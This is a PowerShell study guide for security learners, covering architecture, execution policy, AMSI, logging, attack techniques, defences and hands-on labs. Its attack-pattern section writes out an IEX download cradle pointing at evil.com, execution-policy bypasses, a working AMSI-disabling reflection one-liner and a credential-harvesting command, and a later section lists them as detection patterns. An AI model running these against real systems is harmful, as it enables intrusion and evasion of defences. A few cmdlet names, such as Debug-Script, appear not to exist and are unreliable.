# PowerShell

## What is it?

PowerShell is a command-line shell and scripting language built on the .NET framework (and .NET Core/.NET 5+) for Windows automation and administration. It uses cmdlets, scripts, and modules to perform tasks ranging from system configuration to complex data processing. PowerShell provides deep integration with Windows, WMI/CIM, Active Directory, and nearly every aspect of the operating system.

## Why Learn It?

PowerShell is a powerful tool used by both administrators and attackers. It enables rapid automation of security tasks but is also heavily abused for lateral movement, payload delivery, fileless attacks, and evasion. Security professionals must understand PowerShell to both leverage it for defense and detect/prevent its misuse by adversaries.

## You Will Learn

- PowerShell pipeline architecture and object handling
- Cmdlets, providers, and modules
- Remoting and session management
- Scripting fundamentals and best practices
- Execution policies and security features
- Constrained Language Mode and AMSI
- PowerShell attack techniques and detection
- Logging and monitoring PowerShell activity

## Prerequisites

- Windows Architecture
- Basic scripting concepts

## Related Topics

- Windows Architecture
- Registry
- Active Directory
- Windows Security Tools

## Learning Status

- [x] Theory
- [x] Flowchart
- [x] Internal Architecture
- [x] Hands-on Lab
- [x] Notes Complete

---

## 1. Layer Position Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                    USER-FACING LAYER                             │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────────────┐   │
│  │ Console  │ │ ISE      │ │ VS Code  │ │  PowerShell 7    │   │
│  │ Host     │ │ (legacy) │ │ Extension│ │  (pwsh)          │   │
│  └────┬─────┘ └────┬─────┘ └────┬─────┘ └────────┬─────────┘   │
│       │             │            │                 │             │
│  ┌────┴─────────────┴────────────┴─────────────────┴──────────┐ │
│  │              PowerShell Engine                              │ │
│  │  ┌──────────┬──────────┬──────────┬──────────────────┐     │ │
│  │  │ Parser   │ Compiler │ Runtime  │  Tab Completion  │     │ │
│  │  │          │ (IL)     │ (JIT)    │  IntelliSense    │     │ │
│  │  └──────────┴──────────┴──────────┴──────────────────┘     │ │
│  └────────────────────────┬───────────────────────────────────┘ │
├───────────────────────────┼─────────────────────────────────────┤
│                    PIPELINE LAYER                                │
│  ┌────────────────────────┴───────────────────────────────────┐ │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐     │ │
│  │  │ Cmdlet   │ │ Provider │ │ Module   │ │ Function │     │ │
│  │  │ Binding  │ │ System   │ │ Manager  │ │ /Alias   │     │ │
│  │  └──────────┘ └──────────┘ └──────────┘ └──────────┘     │ │
│  └────────────────────────┬───────────────────────────────────┘ │
├───────────────────────────┼─────────────────────────────────────┤
│                    .NET LAYER                                    │
│  ┌────────────────────────┴───────────────────────────────────┐ │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐     │ │
│  │  │ .NET     │ │ WMI/CIM  │ │ COM      │ │ ADO.NET  │     │ │
│  │  │ Classes  │ │ Bridge   │ │ Objects  │ │ / SQLite │     │ │
│  │  └──────────┘ └──────────┘ └──────────┘ └──────────┘     │ │
│  └────────────────────────┬───────────────────────────────────┘ │
├───────────────────────────┼─────────────────────────────────────┤
│                    OS LAYER                                      │
│  ┌────────────────────────┴───────────────────────────────────┐ │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐     │ │
│  │  │ Win32    │ │ CLR      │ │ .NET     │ │ Windows  │     │ │
│  │  │ API      │ │ Runtime  │ │ Runtime  │ │ API      │     │ │
│  │  └──────────┘ └──────────┘ └──────────┘ └──────────┘     │ │
│  └────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. Internal Architecture

### 2.1 PowerShell Engine

```
PowerShell Engine Architecture
══════════════════════════════

┌──────────────────────────────────────────────────────────────┐
│                    PowerShell Engine                           │
│  ┌──────────────────────────────────────────────────────┐    │
│  │ Parser                                                │    │
│  │ ├─ Tokenizer (lexing)                                │    │
│  │ ├─ AST (Abstract Syntax Tree)                        │    │
│  │ └─ Error handling (ParseError)                        │    │
│  └──────────────────────────────────────────────────────┘    │
│  ┌──────────────────────────────────────────────────────┐    │
│  │ Compiler                                               │    │
│  │ ├─ AST → IL (Intermediate Language)                  │    │
│  │ ├─ Type resolution                                    │    │
│  │ └─ Optimization                                       │    │
│  └──────────────────────────────────────────────────────┘    │
│  ┌──────────────────────────────────────────────────────┐    │
│  │ Runtime                                                │    │
│  │ ├─ CLR (Common Language Runtime) hosting             │    │
│  │ ├─ JIT compilation                                   │    │
│  │ ├─ Garbage collection                                │    │
│  │ └─ Exception handling                                │    │
│  └──────────────────────────────────────────────────────┘    │
│  ┌──────────────────────────────────────────────────────┐    │
│  │ Cmdlet Processor                                     │    │
│  │ ├─ Discovery (Get-Command)                           │    │
│  │ ├─ Parameter binding                                 │    │
│  │ ├─ Pipeline processing                               │    │
│  │ └─ Output formatting                                 │    │
│  └──────────────────────────────────────────────────────┘    │
└──────────────────────────────────────────────────────────────┘
```

### 2.2 Pipeline Architecture

```
PowerShell Pipeline
═══════════════════

┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐
│ Cmdlet 1 │    │ Cmdlet 2 │    │ Cmdlet 3 │    │  Output  │
│ Get-Proc │───►│ Where-   │───►│ Select-  │───►│ Format-  │
│          │    │ Object   │    │ Object   │    │ Table    │
└──────────┘    └──────────┘    └──────────┘    └──────────┘
     │               │               │               │
     ▼               ▼               ▼               ▼
  .NET Object    .NET Object    .NET Object    Formatted
  Collection     Collection     Collection     String

Key Points:
- Pipeline passes OBJECTS (not text)
- Each cmdlet receives objects via Begin/Process/End blocks
- Objects carry type information throughout pipeline
- Formatting only happens at the end (Format-* cmdlets)
```

### 2.3 Provider System

```
PowerShell Providers
════════════════════

Provider    │ Drive │ Description
────────────┼───────┼──────────────────────────────────
FileSystem  │ C:\   │ Files and directories
Registry    │ HKLM: │ Windows Registry
Alias       │ Alias:│ Command aliases
Function    │ Func: │ PowerShell functions
Variable    │ Var:  │ PowerShell variables
Environment │ Env:  │ Environment variables
Certificate │ Cert: │ Certificate stores
WSMan       │ WSMan:│ WS-Management configuration
ActiveDirectory │ AD: │ Active Directory (ADSI)

# List all providers
Get-PSProvider

# Navigate like a file system
cd HKLM:\SOFTWARE\Microsoft\Windows
dir
```

---

## 3. Component Breakdown Table

| Component | Description | Example |
|-----------|-------------|---------|
| **Cmdlet** | Built-in command (Verb-Noun format) | `Get-Process`, `Set-Item` |
| **Provider** | Interface to data stores | FileSystem, Registry, Certificate |
| **Module** | Collection of cmdlets/functions | ActiveDirectory, BitsTransfer |
| **Script** | .ps1 file with PowerShell code | `backup.ps1` |
| **Function** | Reusable code block | `function Get-Admins { }` |
| **Alias** | Short name for cmdlet | `gci` → `Get-ChildItem` |
| **Variable** | Named data container | `$processes` |
| **Object** | .NET instance in pipeline | `[PSCustomObject]@{Name="test"}` |
| **Pipeline** | Chain of cmdlets | `Get-Proc \| Where-Object { }` |
| **Scope** | Variable/function visibility | Global, Script, Local |

### 3.1 Cmdlet Verbs

| Category | Verbs | Purpose |
|----------|-------|---------|
| **Data Retrieval** | Get, Find, Search | Read data |
| **Data Modification** | Set, New, Remove, Update | Write data |
| **Data Movement** | Move, Copy, Import, Export | Transfer data |
| **Lifecycle** | Start, Stop, Restart, Enable, Disable | Control processes |
| **Navigation** | Enter, Exit, Push, Pop | Navigate locations |
| **Security** | Grant, Revoke, Block, Unblock | Permission management |

### 3.2 Common Cmdlets

| Cmdlet | Purpose |
|--------|---------|
| `Get-Help` | Display help for cmdlets |
| `Get-Command` | List available commands |
| `Get-Member` | Show object properties/methods |
| `Get-ChildItem` | List items (files, registry keys) |
| `Get-Content` | Read file contents |
| `Set-Content` | Write file contents |
| `Select-Object` | Filter/project objects |
| `Where-Object` | Filter objects by condition |
| `ForEach-Object` | Iterate over objects |
| `Sort-Object` | Sort objects |
| `Measure-Object` | Calculate statistics |
| `Export-Csv` | Export to CSV |
| `ConvertTo-Json` | Convert to JSON |
| `Invoke-WebRequest` | HTTP requests |
| `Invoke-Command` | Remote execution |

---

## 4. Data Flow Diagram

### 4.1 Command Execution Flow

```
User Types Command
    │
    ▼
Parser (Tokenizer + AST)
    │
    ▼
Compiler (AST → IL)
    │
    ▼
CLR Runtime (JIT → Native Code)
    │
    ▼
Cmdlet Discovery (Get-Command)
    │
    ▼
Parameter Binding
    ├─ ByValue (pipeline object type)
    ├─ ByPropertyName (matching property)
    └─ ByParameterSet
    │
    ▼
Begin Processing
    │
    ▼
Process Block (per input object)
    │
    ▼
End Processing
    │
    ▼
Output Objects → Pipeline
    │
    ▼
Formatter (if Format-* cmdlet used)
    │
    ▼
Display / Export
```

### 4.2 Remote Execution Flow

```
┌──────────┐                    ┌──────────────────┐
│ Client   │                    │ Remote Server    │
│ (PS Home)│                    │ (PS Remote)      │
└────┬─────┘                    └────┬─────────────┘
     │                                │
     │  1. New-PSSession              │
     │  ─────────────────────────────►│
     │  (Kerberos/NTLM auth)         │
     │                                │
     │  2. PSSession Established      │
     │  ◄─────────────────────────────│
     │                                │
     │  3. Invoke-Command             │
     │  (ScriptBlock over WSMan)     │
     │  ─────────────────────────────►│
     │                                │
     │  4. Execution on Remote        │
     │  (WSMan host process)          │
     │                                │
     │  5. Serialized Results         │
     │  ◄─────────────────────────────│
     │                                │
     │  6. Remove-PSSession           │
     │  ─────────────────────────────►│
```

---

## 5. Security Perspective

### 5.1 Execution Policies

| Policy | Description | Risk Level |
|--------|-------------|------------|
| **Restricted** | No scripts can run | Lowest |
| **AllSigned** | Only signed scripts can run | Low |
| **RemoteSigned** | Local scripts run; remote must be signed | Medium |
| **Unrestricted** | All scripts run with warning | High |
| **Bypass** | All scripts run without warning | Critical |
| **Undefined** | No policy set (defaults to Restricted) | Varies |

```powershell
# Check current policy
Get-ExecutionPolicy

# Set policy
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine

# Bypass for current session only
powershell -ExecutionPolicy Bypass
```

### 5.2 Constrained Language Mode (CLM)

```
Constrained Language Mode Restrictions
══════════════════════════════════════

BLOCKED:
- Access .NET types directly ([System.IO.File]::...)
- Call Win32 API (Add-Type with DllImport)
- Use COM objects
- Access certain .NET methods
- Use reflection
- Create runspace pools
- Use certain language features (try/catch/finally limited)

ALLOWED:
- Basic cmdlets (Get-*, Set-*, etc.)
- Pipeline operations
- Variables and basic logic
- Approved .NET types (limited set)
- String manipulation
- Hash tables and arrays

# Check current mode
$ExecutionContext.SessionState.LanguageMode

# Force Constrained Language Mode
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"

# AppLocker sets CLM automatically when active
```

### 5.3 AMSI (Antimalware Scan Interface)

```
AMSI Integration
════════════════

┌──────────────────────────────────────────────────────────────┐
│ PowerShell Engine                                             │
│  ┌──────────────────────────────────────────────────────┐    │
│  │ Script Block Logging                                  │    │
│  │ ├─ Logs full script content to Event ID 4104         │    │
│  │ └─ Includes deobfuscated content                      │    │
│  └──────────────────────────────────────────────────────┘    │
│  ┌──────────────────────────────────────────────────────┐    │
│  │ AMSI Provider Interface                               │    │
│  │ ├─ Sends script content to antimalware engine         │    │
│  │ ├─ Windows Defender integrates here                   │    │
│  │ ├─ Content is scanned BEFORE execution                │    │
│  │ └─ Malicious content blocked (AMSI_RESULT_DETECTED)  │    │
│  └──────────────────────────────────────────────────────┘    │
│  ┌──────────────────────────────────────────────────────┐    │
│  │ Module Logging                                        │    │
│  │ ├─ Logs module name and command invocation            │    │
│  │ └─ Event ID 4103                                      │    │
│  └──────────────────────────────────────────────────────┘    │
└──────────────────────────────────────────────────────────────┘

AMSI Bypass Techniques (for detection):
- Patches amsi.dll in memory
- Modifies AmsiInitFailed flag
- Uses reflection to disable scanning
- Deobfuscation layers
```

### 5.4 PowerShell Logging

| Log Type | Event ID | Description |
|----------|----------|-------------|
| **Module Logging** | 4103 | Module/command invocation |
| **Script Block Logging** | 4104 | Full script content (deobfuscated) |
| **Transcription** | - | Full session transcript to file |
| **Protected Event Logging** | 4104 | Protected events (sensitive) |

```powershell
# Enable logging via Group Policy
# Computer Configuration > Administrative Templates >
# Windows Components > Windows PowerShell

# Or via registry
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
    -Name "EnableScriptBlockLogging" -Value 1

Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" `
    -Name "EnableModuleLogging" -Value 1

# Enable transcription
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" `
    -Name "EnableTranscripting" -Value 1
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" `
    -Name "OutputDirectory" -Value "C:\PSTranscripts"
```

---

## 6. Attack Surface

### 6.1 PowerShell Attack Techniques

| Technique | Description | Mitigation |
|-----------|-------------|------------|
| **Download Cradles** | `Invoke-WebRequest`, `Net.WebClient` | Script Block Logging |
| **Obfuscation** | Base64, string splitting, encodings | AMSI, Script Block Logging |
| **PowerShell Empire** | C2 framework using PS | CLM, AMSI, AppLocker |
| **Mimikatz (PS version)** | Credential dumping in PS | CLM, LSA Protection |
| **PSRemoting** | Lateral movement via sessions | JEA, constrained endpoints |
| **WMI Execution** | Remote code execution via WMI | Monitor WMI events |
| **DLL Loading** | Load malicious DLLs via PS | AMSI, DLL load auditing |
| **Process Hollowing** | Run PS in hollowed process | Memory scanning |

### 6.2 Common Attack Patterns

```powershell
# Download and execute (IEX cradle)
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')

# Base64 encoded command
powershell -enc <base64_string>

# Bypass execution policy
Set-ExecutionPolicy Bypass -Scope Process
powershell -ExecutionPolicy Bypass -File payload.ps1

# AMSI bypass attempt (for detection)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Credential harvesting
Get-GPPPassword  # GPP password extraction
```

### 6.3 Defense Against PowerShell Attacks

```
PowerShell Defense Checklist
═════════════════════════════

1. Execution Policy
   ├─ Set to RemoteSigned or AllSigned
   ├─ Use Group Policy to enforce
   └─ Note: Not a security boundary (can be bypassed)

2. Constrained Language Mode
   ├─ Enable via AppLocker or WDAC
   ├─ Blocks .NET type access and COM
   └─ Combined with script signing = strong control

3. Script Block Logging
   ├─ Enable via GPO or registry
   ├─ Logs ALL script content (even obfuscated)
   ├─ Event ID 4104 contains full deobfuscated code
   └─ Forward to SIEM for analysis

4. Module Logging
   ├─ Enable via GPO
   ├─ Logs module names and commands
   └─ Event ID 4103

5. AMSI Integration
   ├─ Windows Defender AMSI provider
   ├─ Scans scripts before execution
   ├─ Patched by many attacks (monitor for patches)
   └─ Third-party AV also integrates

6. JEA (Just Enough Administration)
   ├─ Restrict what commands users can run
   ├─ Define role-based capabilities
   └─ Limit remote PowerShell access

7. Disable PowerShell v2
   ├─ Uninstall-WindowsFeature PowerShell-V2
   ├─ v2 doesn't support AMSI or logging
   └─ Block via AppLocker or WDAC

8. Monitor and Alert
   ├─ Forward Event IDs 4103, 4104 to SIEM
   ├─ Alert on suspicious script blocks
   ├─ Monitor for AMSI bypass attempts
   └─ Track unusual PowerShell usage patterns
```

---

## 7. Debugging Perspective

### 7.1 PowerShell Debugging

```powershell
# Set breakpoint
Set-PSBreakpoint -Script "script.ps1" -Line 10

# Debug mode
Debug-Script -Path "script.ps1"

# Step through
# s = step into
# v = step over
# c = continue
# l = list current line
# q = quit

# Trace script execution
Set-TraceCommand -Name "script.ps1" -Option ExecutionFlow

# Get error details
$Error[0] | Format-List * -Force
$Error[0].ScriptStackTrace
```

### 7.2 Module Analysis

```powershell
# List all loaded modules
Get-Module -All

# Get module details
Get-Module -Name "Microsoft.PowerShell.Management" | Format-List *

# Find all cmdlets in a module
Get-Command -Module "Microsoft.PowerShell.Management"

# Get cmdlet parameters
Get-Help "Get-Process" -Parameter *

# Show object methods/properties
Get-Process | Get-Member
Get-Process | Get-Member -MemberType Method
```

---

## 8. Reverse Engineering Perspective

### 8.1 PowerShell Script Block Analysis

```
Analyzing Malicious PowerShell
══════════════════════════════

1. Script Block Logging (Event ID 4104)
   - Contains FULL deobfuscated script content
   - Even heavily obfuscated scripts appear clean
   - Search for suspicious patterns:
     * IEX / Invoke-Expression
     * Net.WebClient / DownloadString
     * [Convert]::FromBase64String
     * Add-Type with DllImport
     * Reflection.Assembly
     * AmsiUtils / amsiInitFailed

2. Decompilation
   - PowerShell scripts compile to IL
   - Use ILSpy or dotPeek to examine
   - Look for anti-analysis techniques

3. Dynamic Analysis
   - Run in sandboxed environment
   - Monitor network connections
   - Track file system changes
   - Capture memory dumps

4. Deobfuscation Techniques
   - Replace string concatenation
   - Decode Base64 strings
   - Evaluate variables in context
   - Reconstruct script blocks
```

### 8.2 PowerShell Object Model

```
System.Management.Automation.dll
├─ PowerShell Class
│   ├─ Commands (cmdlet pipeline)
│   ├─ Streams (output, error, warning)
│   └─ State (running, stopped, etc.)
├─ CommandInfo
│   ├─ CmdletInfo
│   ├─ FunctionInfo
│   └─ AliasInfo
├─ ParameterMetadata
│   ├─ Name, Type, ParameterSet
│   └─ Mandatory, Position, ValueFromPipeline
├─ SessionState
│   ├─ Provider
│   ├─ Scope (Global, Script, Local)
│   └─ Command Discovery
└─ Pipeline
    ├─ Input processing
    ├─ Command execution
    └─ Output formatting
```

---

## 9. Practical Examples

### Example 1: Enumerate System Information

```powershell
# System info
Get-CimInstance -ClassName Win32_OperatingSystem |
    Select-Object Caption, Version, BuildNumber, OSArchitecture

# Running processes
Get-Process | Sort-Object CPU -Descending |
    Select-Object -First 10 Name, Id, CPU, WorkingSet64

# Network connections
Get-NetTCPConnection -State Established |
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort
```

### Example 2: Security Audit Script

```powershell
function Get-SecurityAudit {
    [CmdletBinding()]
    param()

    Write-Host "=== Security Audit ===" -ForegroundColor Yellow

    # Check execution policy
    $policy = Get-ExecutionPolicy
    Write-Host "Execution Policy: $policy"

    # Check PowerShell version
    Write-Host "PS Version: $($PSVersionTable.PSVersion)"

    # Check logging
    $sbLogging = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
        -Name "EnableScriptBlockLogging" -ErrorAction SilentlyContinue
    Write-Host "Script Block Logging: $(if ($sbLogging) {'Enabled'} else {'Disabled'})"

    # Check language mode
    Write-Host "Language Mode: $($ExecutionContext.SessionState.LanguageMode)"

    # Check for suspicious scheduled tasks
    Get-ScheduledTask | Where-Object {
        $_.Actions.Execute -match "powershell"
    } | Select-Object TaskName, TaskPath
}

Get-SecurityAudit
```

### Example 3: Remote Execution

```powershell
# Create session to remote computer
$session = New-PSSession -ComputerName "SERVER01"

# Execute command remotely
Invoke-Command -Session $session -ScriptBlock {
    Get-Service | Where-Object { $_.Status -eq 'Running' }
}

# Execute script file remotely
Invoke-Command -Session $session -FilePath ".\audit.ps1"

# Remove session
Remove-PSSession $session
```

### Example 4: Module Development

```powershell
# Create a module
New-Module -Name "SecurityTools" -ScriptBlock {
    function Get-PasswordPolicy {
        net accounts
    }

    function Test-Admin {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }

    Export-ModuleMember -Function Get-PasswordPolicy, Test-Admin
}
```

---

## 10. Interview Questions

1. **What is the PowerShell pipeline and how does it differ from Unix pipes?**
   PowerShell passes .NET objects through the pipeline, preserving type information. Unix pipes pass text streams. This means PowerShell can filter, sort, and manipulate structured data without parsing text.

2. **Explain the difference between `Where-Object` and `ForEach-Object`.**
   `Where-Object` filters objects based on a condition (like SQL WHERE). `ForEach-Object` iterates over objects and performs operations on each (like a for loop).

3. **What is Execution Policy and why is it not a security boundary?**
   Execution Policy controls which scripts can run (Restricted, AllSigned, RemoteSigned, etc.). It's not a security boundary because it can be bypassed with `-ExecutionPolicy Bypass` flag or by setting it in the current session.

4. **How does AMSI protect PowerShell?**
   AMSI (Antimalware Scan Interface) sends script content to the antimalware engine before execution. Windows Defender scans the content and blocks malicious scripts. However, AMSI can be patched in memory by sophisticated attacks.

5. **What is Constrained Language Mode?**
   CLM restricts PowerShell to basic cmdlets and operations. It blocks .NET type access, COM objects, Win32 API calls, and reflection. It's enforced by AppLocker or WDAC and provides a strong security control.

6. **How do you enable PowerShell logging for security monitoring?**
   Enable Script Block Logging (Event ID 4104), Module Logging (Event ID 4103), and Transcription via Group Policy or registry. Forward logs to SIEM for analysis.

7. **What is JEA (Just Enough Administration)?**
   JEA is a security technology that enables role-based access control for PowerShell remoting. It restricts which commands and parameters users can execute on remote systems.

8. **How can you detect malicious PowerShell activity?**
   Monitor Event IDs 4103, 4104 for suspicious script blocks. Look for patterns like IEX, DownloadString, Base64 decoding, reflection, and AMSI bypass attempts. Track unusual PowerShell usage patterns.

9. **What is the difference between `-Filter` and `Where-Object`?**
   `-Filter` is processed server-side (more efficient for AD/WMI queries). `Where-Object` is client-side filtering (works on any object). Use `-Filter` when available for performance.

10. **How does PowerShell remoting work?**
    PowerShell remoting uses WS-Management (WinRM) protocol. Sessions are established via `New-PSSession`, commands execute via `Invoke-Command`, and results are serialized back. Authentication uses Kerberos or NTLM.

---

## 11. Hands-on Labs

### Lab 1: Pipeline Deep Dive

```powershell
# 1. Explore the pipeline with Get-Member
Get-Process | Get-Member -MemberType NoteProperty
Get-Process | Get-Member -MemberType Method

# 2. Complex pipeline operations
Get-Process |
    Where-Object { $_.CPU -gt 10 } |
    Sort-Object CPU -Descending |
    Select-Object -First 5 Name, Id, CPU, @{N='MemoryMB';E={$_.WorkingSet64/1MB}} |
    Format-Table -AutoSize

# 3. Group and aggregate
Get-Process |
    Group-Object -Property ProcessName |
    Where-Object { $_.Count -gt 1 } |
    Select-Object Name, Count |
    Sort-Object Count -Descending
```

### Lab 2: Remote Security Audit

```powershell
# 1. Create remote session
$cred = Get-Credential
$session = New-PSSession -ComputerName "DC01" -Credential $cred

# 2. Run audit commands remotely
Invoke-Command -Session $session -ScriptBlock {
    # Check for admin accounts
    Get-ADGroupMember "Domain Admins"

    # Check GPO application
    gpresult /r

    # Check services
    Get-Service | Where-Object { $_.StartType -eq 'Automatic' -and $_.Status -ne 'Running' }
}

# 3. Clean up
Remove-PSSession $session
```

### Lab 3: Build a PowerShell Module

```powershell
# 1. Create module directory
New-Item -Path "$env:USERPROFILE\Documents\PowerShell\Modules\SecurityAudit" -ItemType Directory

# 2. Create module manifest
New-ModuleManifest -Path "$env:USERPROFILE\Documents\PowerShell\Modules\SecurityAudit\SecurityAudit.psd1" `
    -RootModule "SecurityAudit.psm1" `
    -Author "Security Team" `
    -Description "Security audit module"

# 3. Create module file with functions
# SecurityAudit.psm1
function Get-WeakPermissions {
    # Find files with weak permissions
}

function Test-PasswordStrength {
    # Check password policy
}

Export-ModuleMember -Function Get-WeakPermissions, Test-PasswordStrength

# 4. Import and test
Import-Module SecurityAudit
Get-Command -Module SecurityAudit
```

### Lab 4: AMSI and Bypass Detection

```powershell
# 1. Check AMSI status
Get-WindowsOptionalFeature -Online -FeatureName Microsoft-PowerShell-AMSI

# 2. Test AMSI with a benign script
# Create test script with suspicious patterns (but benign)
$testScript = @'
$code = '[DllImport("kernel32.dll")]public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);'
Add-Type -MemberDefinition $code -Name "Kernel32" -Namespace "Win32" -PassThru
'@

# 3. Monitor Event ID 4104 for AMSI detection
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} |
    Where-Object { $_.Message -match "AMSI" } |
    Select-Object TimeCreated, Message -First 5
```

### Lab 5: Script Block Logging Analysis

```powershell
# 1. Enable Script Block Logging
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
    -Name "EnableScriptBlockLogging" -Value 1

# 2. Run some PowerShell commands
Get-Process
Get-Service
1..5 | ForEach-Object { Write-Output "Iteration $_" }

# 3. Retrieve logs
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    ID=4104
} | Select-Object TimeCreated, @{N='ScriptBlock';E={$_.Properties[2].Value}} -First 10

# 4. Search for specific patterns
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} |
    Where-Object { $_.Properties[2].Value -match "Invoke-Expression|IEX|DownloadString" } |
    Select-Object TimeCreated, @{N='Script';E={$_.Properties[2].Value}}
```

---

## 12. Summary Table

| Topic | Key Takeaway |
|-------|-------------|
| **Pipeline** | Passes .NET objects, not text; preserves type information |
| **Cmdlets** | Verb-Noun format, implement Begin/Process/End blocks |
| **Providers** | Uniform interface to data stores (FileSystem, Registry, AD) |
| **Modules** | Collections of cmdlets/functions for distribution |
| **Remoting** | WS-Management based; sessions via `New-PSSession` |
| **Execution Policy** | Controls script execution; NOT a security boundary |
| **Constrained Language** | Restricts .NET/COM/API access; enforced by AppLocker/WDAC |
| **AMSI** | Scans scripts before execution; integrated with Defender |
| **Logging** | Script Block (4104), Module (4103), Transcription |
| **JEA** | Role-based access control for remote PowerShell |
| **Attack Surface** | Download cradles, obfuscation, C2, credential theft |
| **Defense** | CLM + AMSI + Logging + AppLocker + monitoring |
| **v2 Deprecation** | PowerShell v2 lacks AMSI/logging; must be disabled |
| **Object Model** | System.Management.Automation.dll core types |
| **Debugging** | Set-PSBreakpoint, Trace-Command, $Error |

---

## Resources

Books:
- *Learn PowerShell in a Month of Lunches* — Travis Plunk, James Petty
- *PowerShell for Pentesters* — Nik Mittal
- *PowerShell Security: Defending the Enterprise* — Don Jones

Videos:
- Black Hat / DEF CON PowerShell talks
- PowerShell Summit recordings
- Travis Plunk's PowerShell security presentations

Documentation:
- [Microsoft PowerShell Docs](https://learn.microsoft.com/en-us/powershell/)
- [PowerShell Security Best Practices](https://learn.microsoft.com/en-us/powershell/scripting/learn/security/)
- [AMSI Documentation](https://learn.microsoft.com/en-us/windows/win32/amsi/)

Tools:
- PowerShell Gallery — https://www.powershellgallery.com/
- PSScriptAnalyzer — https://github.com/PowerShell/PSScriptAnalyzer
- PowerShell Team Blog — https://devblogs.microsoft.com/powershell/
